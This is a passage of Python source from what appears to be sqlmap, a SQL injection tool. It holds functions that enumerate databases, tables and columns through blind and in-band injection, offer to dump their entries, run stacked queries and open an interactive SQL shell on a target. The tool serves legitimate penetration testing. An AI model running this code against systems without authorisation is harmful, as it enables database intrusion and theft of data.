                count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                if not isNumPosStrValue(count):
                    warnMsg = "no database"
                    if dbConsider == "1":
                        warnMsg += "s like"
                    warnMsg += " '%s' found" % unsafeSQLIdentificatorNaming(db)
                    logger.warn(warnMsg)

                    continue

                indexRange = getRange(count)

                for index in indexRange:
                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        query = rootQuery.blind.query2
                    else:
                        query = rootQuery.blind.query
                    query += dbQuery
                    query += exclDbsQuery
                    if Backend.isDbms(DBMS.DB2):
                        query += ") AS foobar"
                    query = agent.limitQuery(index, query, dbCond)

                    value = inject.getValue(query, inband=False, error=False)
                    value = safeSQLIdentificatorNaming(value)
                    foundDbs.append(value)

        return foundDbs

    def searchTable(self):
        bruteForce = False

        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
            errMsg = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            bruteForce = True

        elif Backend.isDbms(DBMS.ACCESS):
            errMsg = "cannot retrieve table names, "
            errMsg += "back-end DBMS is Access"
            logger.error(errMsg)
            bruteForce = True

        if bruteForce:
            message = "do you want to use common table existence check? [Y/n/q]"
            test = readInput(message, default="Y")

            if test[0] in ("n", "N"):
                return
            elif test[0] in ("q", "Q"):
                raise sqlmapUserQuitException
            else:
                regex = "|".join(conf.tbl.split(","))
                return tableExists(paths.COMMON_TABLES, regex)

        rootQuery = queries[Backend.getIdentifiedDbms()].search_table
        foundTbls = {}
        tblList = conf.tbl.split(",")
        tblCond = rootQuery.inband.condition
        dbCond = rootQuery.inband.condition2

        tblConsider, tblCondParam = self.likeOrExact("table")

        for tbl in tblList:
            tbl = safeSQLIdentificatorNaming(tbl, True)

            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                tbl = tbl.upper()

            infoMsg = "searching table"
            if tblConsider == "1":
                infoMsg += "s like"
            infoMsg += " '%s'" % unsafeSQLIdentificatorNaming(tbl)
            logger.info(infoMsg)

            if conf.db and conf.db != "CD":
                _ = conf.db.split(",")
                whereDbsQuery = "".join(" AND '%s' = %s" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in _)
                infoMsg = "for database%s '%s'" % ("s" if len(_) > 1 else "", ", ".join(db for db in _))
                logger.info(infoMsg)
            elif conf.excludeSysDbs:
                whereDbsQuery = "".join(" AND '%s' != %s" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in self.excludeDbsList)
                infoMsg = "skipping system database%s '%s'" % ("s" if len(self.excludeDbsList) > 1 else "", ", ".join(db for db in self.excludeDbsList))
                logger.info(infoMsg)
            else:
                whereDbsQuery = ""

            tblQuery = "%s%s" % (tblCond, tblCondParam)
            tblQuery = tblQuery % tbl

            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
                query = rootQuery.inband.query
                query += tblQuery
                query += whereDbsQuery
                values = inject.getValue(query, blind=False)

                for foundDb, foundTbl in filterPairValues(values):
                    foundDb = safeSQLIdentificatorNaming(foundDb)
                    foundTbl = safeSQLIdentificatorNaming(foundTbl, True)

                    if foundDb is None or foundTbl is None:
                        continue

                    if foundDb in foundTbls:
                        foundTbls[foundDb].append(foundTbl)
                    else:
                        foundTbls[foundDb] = [ foundTbl ]
            else:
                infoMsg = "fetching number of databases with table"
                if tblConsider == "1":
                    infoMsg += "s like"
                infoMsg += " '%s'" % unsafeSQLIdentificatorNaming(tbl)
                logger.info(infoMsg)

                query = rootQuery.blind.count
                query += tblQuery
                query += whereDbsQuery
                count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                if not isNumPosStrValue(count):
                    warnMsg = "no databases have table"
                    if tblConsider == "1":
                        warnMsg += "s like"
                    warnMsg += " '%s'" % unsafeSQLIdentificatorNaming(tbl)
                    logger.warn(warnMsg)

                    continue

                indexRange = getRange(count)

                for index in indexRange:
                    query = rootQuery.blind.query
                    query += tblQuery
                    query += whereDbsQuery
                    if Backend.isDbms(DBMS.DB2):
                        query += ") AS foobar"
                    query = agent.limitQuery(index, query)
                    foundDb = inject.getValue(query, inband=False, error=False)
                    foundDb = safeSQLIdentificatorNaming(foundDb)

                    if foundDb not in foundTbls:
                        foundTbls[foundDb] = []

                    if tblConsider == "2":
                        foundTbls[foundDb].append(tbl)

                if tblConsider == "2":
                    continue

                for db in foundTbls.keys():
                    db = safeSQLIdentificatorNaming(db)

                    infoMsg = "fetching number of table"
                    if tblConsider == "1":
                        infoMsg += "s like"
                    infoMsg += " '%s' in database '%s'" % (unsafeSQLIdentificatorNaming(tbl), db)
                    logger.info(infoMsg)

                    query = rootQuery.blind.count2
                    query = query % unsafeSQLIdentificatorNaming(db)
                    query += " AND %s" % tblQuery
                    count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                    if not isNumPosStrValue(count):
                        warnMsg = "no table"
                        if tblConsider == "1":
                            warnMsg += "s like"
                        warnMsg += " '%s' " % unsafeSQLIdentificatorNaming(tbl)
                        warnMsg += "in database '%s'" % db
                        logger.warn(warnMsg)

                        continue

                    indexRange = getRange(count)

                    for index in indexRange:
                        query = rootQuery.blind.query2
                        query = query % unsafeSQLIdentificatorNaming(db)
                        query += " AND %s" % tblQuery
                        query = agent.limitQuery(index, query)
                        foundTbl = inject.getValue(query, inband=False, error=False)
                        kb.hintValue = foundTbl
                        foundTbl = safeSQLIdentificatorNaming(foundTbl, True)
                        foundTbls[db].append(foundTbl)

        return foundTbls

    def searchColumn(self):
        bruteForce = False

        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
            errMsg = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            bruteForce = True

        elif Backend.isDbms(DBMS.ACCESS):
            errMsg = "cannot retrieve column names, "
            errMsg += "back-end DBMS is Access"
            logger.error(errMsg)
            bruteForce = True

        if bruteForce:
            message = "do you want to use common columns existence check? [Y/n/q]"
            test = readInput(message, default="Y")

            if test[0] in ("n", "N"):
                return
            elif test[0] in ("q", "Q"):
                raise sqlmapUserQuitException
            else:
                regex = "|".join(conf.col.split(","))
                conf.dumper.dbTableColumns(columnExists(paths.COMMON_COLUMNS, regex))

                message = "do you want to dump entries? [Y/n] "
                output = readInput(message, default="Y")

                if output and output[0] not in ("n", "N"):
                    self.dumpAll()

                return

        rootQuery = queries[Backend.getIdentifiedDbms()].search_column
        foundCols = {}
        dbs = {}
        colList = conf.col.split(",")
        colCond = rootQuery.inband.condition
        dbCond = rootQuery.inband.condition2

        colConsider, colCondParam = self.likeOrExact("column")

        for column in colList:
            column = safeSQLIdentificatorNaming(column)

            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                column = column.upper()

            infoMsg = "searching column"
            if colConsider == "1":
                infoMsg += "s like"
            infoMsg += " '%s'" % unsafeSQLIdentificatorNaming(column)
            logger.info(infoMsg)

            foundCols[column] = {}

            if conf.db and conf.db != "CD":
                _ = conf.db.split(",")
                whereDbsQuery = "".join(" AND '%s' = %s" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in _)
                infoMsg = "for database%s '%s'" % ("s" if len(_) > 1 else "", ", ".join(db for db in _))
                logger.info(infoMsg)
            elif conf.excludeSysDbs:
                whereDbsQuery = "".join(" AND '%s' != %s" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in self.excludeDbsList)
                infoMsg = "skipping system database%s '%s'" % ("s" if len(self.excludeDbsList) > 1 else "", ", ".join(db for db in self.excludeDbsList))
                logger.info(infoMsg)
            else:
                whereDbsQuery = ""

            colQuery = "%s%s" % (colCond, colCondParam)
            colQuery = colQuery % unsafeSQLIdentificatorNaming(column)

            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
                if not all((conf.db, conf.tbl)):
                    query = rootQuery.inband.query
                    query += colQuery
                    query += whereDbsQuery
                    values = inject.getValue(query, blind=False)
                else:
                    values = ((conf.db, conf.tbl),)

                for foundDb, foundTbl in filterPairValues(values):
                    foundDb = safeSQLIdentificatorNaming(foundDb)
                    foundTbl = safeSQLIdentificatorNaming(foundTbl, True)

                    if foundDb is None or foundTbl is None:
                        continue

                    if foundDb not in dbs:
                        dbs[foundDb] = {}

                    if foundTbl not in dbs[foundDb]:
                        dbs[foundDb][foundTbl] = {}

                    if colConsider == "1":
                        conf.db = foundDb
                        conf.tbl = foundTbl
                        conf.col = column

                        self.getColumns(onlyColNames=True, colTuple=(colConsider, colCondParam))

                        if foundDb in kb.data.cachedColumns and foundTbl in kb.data.cachedColumns[foundDb]:
                            dbs[foundDb][foundTbl].update(kb.data.cachedColumns[foundDb][foundTbl])
                        kb.data.cachedColumns = {}
                    else:
                        dbs[foundDb][foundTbl][column] = None

                    if foundDb in foundCols[column]:
                        foundCols[column][foundDb].append(foundTbl)
                    else:
                        foundCols[column][foundDb] = [ foundTbl ]
            else:
                if not conf.db:
                    infoMsg = "fetching number of databases with tables containing column"
                    if colConsider == "1":
                        infoMsg += "s like"
                    infoMsg += " '%s'" % column
                    logger.info(infoMsg)

                    query = rootQuery.blind.count
                    query += colQuery
                    query += whereDbsQuery
                    count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                    if not isNumPosStrValue(count):
                        warnMsg = "no databases have tables containing column"
                        if colConsider == "1":
                            warnMsg += "s like"
                        warnMsg += " '%s'" % column
                        logger.warn(warnMsg)

                        continue

                    indexRange = getRange(count)

                    for index in indexRange:
                        query = rootQuery.blind.query
                        query += colQuery
                        query += whereDbsQuery
                        if Backend.isDbms(DBMS.DB2):
                            query += ") AS foobar"
                        query = agent.limitQuery(index, query)
                        db = inject.getValue(query, inband=False, error=False)
                        db = safeSQLIdentificatorNaming(db)

                        if db not in dbs:
                            dbs[db] = {}

                        if db not in foundCols[column]:
                            foundCols[column][db] = []
                else:
                    for db in conf.db.split(","):
                        dbs[db] = {}
                        if db not in foundCols[column]:
                            foundCols[column][db] = []

                for column, dbData in foundCols.items():
                    colQuery = "%s%s" % (colCond, colCondParam)
                    colQuery = colQuery % column

                    for db in dbData:
                        db = safeSQLIdentificatorNaming(db)

                        infoMsg = "fetching number of tables containing column"
                        if colConsider == "1":
                            infoMsg += "s like"
                        infoMsg += " '%s' in database '%s'" % (unsafeSQLIdentificatorNaming(column), db)
                        logger.info(infoMsg)

                        query = rootQuery.blind.count2
                        query = query % db
                        query += " AND %s" % colQuery
                        count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                        if not isNumPosStrValue(count):
                            warnMsg = "no tables contain column"
                            if colConsider == "1":
                                warnMsg += "s like"
                            warnMsg += " '%s' " % column
                            warnMsg += "in database '%s'" % db
                            logger.warn(warnMsg)

                            continue

                        indexRange = getRange(count)

                        for index in indexRange:
                            query = rootQuery.blind.query2
                            query = query % db
                            query += " AND %s" % colQuery
                            query = agent.limitQuery(index, query)
                            tbl = inject.getValue(query, inband=False, error=False)
                            kb.hintValue = tbl

                            tbl = safeSQLIdentificatorNaming(tbl, True)

                            if tbl not in dbs[db]:
                                dbs[db][tbl] = {}

                            if colConsider == "1":
                                conf.db = db
                                conf.tbl = tbl
                                conf.col = column

                                self.getColumns(onlyColNames=True, colTuple=(colConsider, colCondParam))

                                if db in kb.data.cachedColumns and tbl in kb.data.cachedColumns[db]:
                                    dbs[db][tbl].update(kb.data.cachedColumns[db][tbl])
                                kb.data.cachedColumns = {}
                            else:
                                dbs[db][tbl][column] = None

                            foundCols[column][db].append(tbl)

        self.dumpFoundColumn(dbs, foundCols, colConsider)

    def search(self):
        if conf.db and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            for item in ('db', 'tbl', 'col'):
                if getattr(conf, item, None):
                    setattr(conf, item, getattr(conf, item).upper())

        if conf.col:
            self.searchColumn()

        elif conf.tbl:
            conf.dumper.dbTables(self.searchTable())

        elif conf.db:
            conf.dumper.lister("found databases", self.searchDb())

        else:
            errMsg = "missing parameter, provide -D, -T or -C together "
            errMsg += "with --search"
            raise sqlmapMissingMandatoryOptionException, errMsg

    def sqlQuery(self, query):
        output = None
        sqlType = None
        getOutput = None

        query = query.rstrip(';')

        for sqlTitle, sqlStatements in SQL_STATEMENTS.items():
            for sqlStatement in sqlStatements:
                if query.lower().startswith(sqlStatement):
                    sqlType = sqlTitle
                    break

        if not sqlType or 'SELECT' in sqlType:
            infoMsg = "fetching %s query output: '%s'" % (sqlType if sqlType is not None else "SQL", query)
            logger.info(infoMsg)

            output = inject.getValue(query, fromUser=True)

            return output
        else:
            if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and not conf.direct:
                warnMsg = "execution of custom SQL queries is only "
                warnMsg += "available when stacked queries are supported"
                logger.warn(warnMsg)
                return None
            else:
                if sqlType:
                    infoMsg = "executing %s query: '%s'" % (sqlType if sqlType is not None else "SQL", query)
                else:
                    infoMsg = "executing unknown SQL type query: '%s'" % query
                logger.info(infoMsg)

                inject.goStacked(query)

                infoMsg = "done"
                logger.info(infoMsg)

                output = False

        return output

    def sqlShell(self):
        infoMsg = "calling %s shell. To quit type " % Backend.getIdentifiedDbms()
        infoMsg += "'x' or 'q' and press ENTER"
        logger.info(infoMsg)

        autoCompletion(sqlShell=True)

        while True:
            query = None

            try:
                query = raw_input("sql-shell> ")
                query = utf8decode(query)
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not query:
                continue

            if query.lower() in ( "x", "q", "exit", "quit" ):
                break

            output = self.sqlQuery(query)

            if output and output != "Quit":
                conf.dumper.query(query, output)

            elif not output:
                pass

            elif output != "Quit":
                dataToStdout("No output\n")
